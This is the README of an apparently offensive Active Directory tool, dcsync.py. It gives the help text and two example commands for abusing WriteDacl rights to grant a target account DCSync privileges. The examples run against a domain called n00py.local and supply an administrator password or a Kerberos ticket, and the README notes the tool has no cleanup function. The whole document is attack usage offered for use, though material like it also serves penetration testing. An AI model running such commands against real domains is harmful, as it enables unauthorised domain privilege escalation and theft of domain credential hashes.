#Adding DCSync Permissions

```
usage: dcsync.py [-h] -dc FQDN -t USERNAME [-hashes LMHASH:NTHASH] [-k] identity

WriteDacl Attack: To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

positional arguments:
  identity              domain\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)

optional arguments:
  -h, --help            show this help message and exit
  -dc FQDN              FQDN of the Domain Controller
  -t USERNAME           Target user to be escalated
  -hashes LMHASH:NTHASH
                        Hash for LDAP auth (instead of password)
  -k                    If you want to use a Kerberos ticket

Example: ./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123

Example: ./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
```

Warning: This toold does not contain a cleanup function (yet?)
